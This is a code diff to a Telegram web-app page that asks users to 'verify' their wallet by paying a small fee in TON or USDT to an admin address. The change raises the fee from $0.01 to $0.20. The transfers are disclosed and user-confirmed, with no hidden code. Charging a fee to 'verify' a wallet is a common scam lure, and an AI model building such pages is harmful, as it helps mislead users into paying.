@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify Fee ($0.01 USD)</title>
+  <title>Verify Fee ($0.20 USD)</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
@@ -58,20 +58,20 @@
   </style>
 </head>
 <body>
-  <h2>Verify Fee ($0.01 USD)</h2>
+  <h2>Verify Fee ($0.20 USD)</h2>
 
   <!-- TON Network Card -->
   <div class="card">
     <h3 style="color: #0098EA;">TON Network</h3>
     <div id="ton-connect"></div>
-    <button id="ton-pay-btn" class="pay-btn" onclick="payTonFee()">Pay $0.01 in TON</button>
+    <button id="ton-pay-btn" class="pay-btn" onclick="payTonFee()">Pay $0.20 in TON</button>
   </div>
 
   <!-- USDT (BSC BEP-20) Card -->
   <div class="card">
     <h3 style="color: #26a17b;">USDT (BNB Smart Chain)</h3>
     <button id="bsc-connect-btn" class="usdt-btn" onclick="handleBSCAction()">Connect / Open in Trust Wallet</button>
-    <button id="usdt-pay-btn" class="pay-btn" onclick="payUsdtFee()">Pay 0.01 USDT (BEP-20)</button>
+    <button id="usdt-pay-btn" class="pay-btn" onclick="payUsdtFee()">Pay 0.2 USDT (BEP-20)</button>
   </div>
 
   <div id="status">Select a network to verify your wallet.</div>
@@ -113,16 +113,16 @@
     async function payTonFee() {
       try {
         statusDiv.style.color = "#0098EA";
-        statusDiv.innerText = "Fetching TON price for $0.01...";
+        statusDiv.innerText = "Fetching TON price for $0.20...";
         
         const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=TONUSDT');
         const data = await res.json();
         const tonPrice = parseFloat(data.price);
         
-        const tonAmount = 0.01 / tonPrice;
+        const tonAmount = 0.20 / tonPrice;
         const nanoTons = Math.ceil(tonAmount * 1e9).toString();
 
-        statusDiv.innerText = `Sending ${tonAmount.toFixed(5)} TON ($0.01)... Confirm in Tonkeeper`;
+        statusDiv.innerText = `Sending ${tonAmount.toFixed(5)} TON ($0.20)... Confirm in Tonkeeper`;
 
         const tx = {
           validUntil: Math.floor(Date.now() / 1000) + 300,
@@ -194,17 +194,17 @@
     async function payUsdtFee() {
       try {
         statusDiv.style.color = "#26a17b";
-        statusDiv.innerText = "Sending 0.01 USDT (BEP-20)... Confirm in Trust Wallet";
+        statusDiv.innerText = "Sending 0.2 USDT (BEP-20)... Confirm in Trust Wallet";
 
         const usdtContract = new ethers.Contract(USDT_BSC_CONTRACT, USDT_ABI, signer);
-        const amount = ethers.parseUnits("0.01", 18);
+        const amount = ethers.parseUnits("0.2", 18);
 
         const tx = await usdtContract.transfer(BSC_ADMIN, amount);
         statusDiv.innerText = "Confirming USDT transfer on BSC...";
         await tx.wait();
 
         statusDiv.style.color = "#0ecb81";
-        statusDiv.innerText = "✅ USDT Verified! (0.01 USDT paid)";
+        statusDiv.innerText = "✅ USDT Verified! (0.2 USDT paid)";
       } catch (err) {
         statusDiv.style.color = "#f6465d";
         statusDiv.innerText = "❌ USDT Payment failed: " + (err.reason || err.message);
